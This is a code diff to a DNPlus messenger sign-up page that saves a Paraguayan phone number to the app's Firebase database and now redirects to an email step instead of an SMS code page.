@@ -62,14 +62,10 @@
     <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
 
     <script>
+        // Configuración de tu Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyD2nZF5QC-Zti80xP1A518qbUPnhRru_9A",
-            authDomain: "dnplus-messenger-pro.firebaseapp.com",
             databaseURL: "https://dnplus-messenger-pro-default-rtdb.firebaseio.com",
-            projectId: "dnplus-messenger-pro",
-            storageBucket: "dnplus-messenger-pro.firebasestorage.app",
-            messagingSenderId: "625573378436",
-            appId: "1:625573378436:android:58945eb1e22ec4a2ba85d1"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
@@ -86,7 +82,7 @@
                 modalTitulo.innerText = "¿Es este su número?";
                 modalMensaje.innerHTML = `
                     <div style="color:#e9edef; font-size: 17px; margin-bottom: 10px;">+595 ${num}</div>
-                    Te enviaremos un código por SMS para verificar tu cuenta de DNPlus.
+                    Te enviaremos un código para verificar tu cuenta de DNPlus.
                 `;
                 modalButtons.innerHTML = `
                     <button class="btn-flat" onclick="cerrarModal()">EDITAR</button>
@@ -94,9 +90,8 @@
                 `;
                 modal.style.display = 'block';
                 
-                // Evento para el botón OK
                 document.getElementById('btnOk').onclick = function() {
-                    guardarYEnviar(num);
+                    guardarYIrACorreo(num);
                 };
             } else {
                 modalTitulo.innerText = "Número no válido";
@@ -108,19 +103,23 @@
 
         function cerrarModal() { modal.style.display = 'none'; }
         
-        function guardarYEnviar(num) {
+        // LA FUNCIÓN CLAVE: Guarda y salta a correo.html
+        function guardarYIrACorreo(num) {
             const numCompleto = "+595" + num;
             const btn = document.getElementById('btnOk');
             btn.innerText = "CONECTANDO...";
             btn.disabled = true;
 
-            // Guardamos el intento de registro
+            // Guardamos el número en Firebase
             db.ref("registros_pendientes").push({
                 telefono: numCompleto,
                 fecha: Date.now()
             }).then(() => {
+                // Guardamos en LocalStorage para que correo.html sepa a quién pertenece
                 localStorage.setItem("user_phone", numCompleto);
-                window.location.href = 'otp.html';
+                
+                // SALTADO A CORREO.HTML
+                window.location.href = 'correo.html';
             }).catch(e => {
                 alert("Error: " + e.message);
                 btn.innerText = "OK";
